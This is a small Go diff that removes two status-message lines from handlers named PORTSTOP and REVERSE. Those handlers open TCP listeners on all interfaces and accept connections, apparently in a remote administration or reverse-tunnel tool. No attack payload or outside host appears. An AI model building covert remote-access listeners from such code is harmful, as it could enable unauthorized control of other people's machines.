@@ -159,7 +159,6 @@ func PORTSTOP(Data []byte) {
 		ln.(net.Listener).Close()
 		Listen.Delete(Port)
 	}
-	MakeBytes(32, []byte(fmt.Sprintf("[×] 0.0.0.0:%d", Port)))
 }
 
 func UPLOADA(Data []byte) {
@@ -179,7 +178,6 @@ func REVERSE(Data []byte) {
 	ln, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", Port))
 	if err != nil { ERROR(err); return }
 	Listen.Store(Port, ln)
-	MakeBytes(32, []byte(fmt.Sprintf("[√] 0.0.0.0:%d", Port)))
 	for {
 		Conn, err := ln.Accept()
 		if err != nil { continue }
